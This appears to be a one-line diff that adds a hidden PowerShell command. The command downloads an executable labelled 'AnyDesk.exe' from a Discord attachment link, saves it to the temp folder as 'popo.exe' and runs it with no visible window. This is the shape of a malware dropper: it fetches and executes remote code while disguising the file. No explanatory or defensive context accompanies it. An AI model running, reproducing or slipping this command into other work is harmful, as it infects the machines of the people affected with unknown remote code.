@@ -1,0 +1,1 @@
+powershell.exe -NoProfile -WindowStyle Hidden -Command "$url = 'https://cdn.discordapp.com/attachments/1355757942342684815/1427524991808704522/AnyDesk.exe?ex=68ef2dc0&is=68eddc40&hm=9e874dc00606225ea90776634190744ab9d8223160442c66e8cf4caa1b2aafa0&'; $out = Join-Path $env:TEMP 'popo.exe'; Invoke-WebRequest -Uri $url -OutFile $out; Start-Process -FilePath $out"
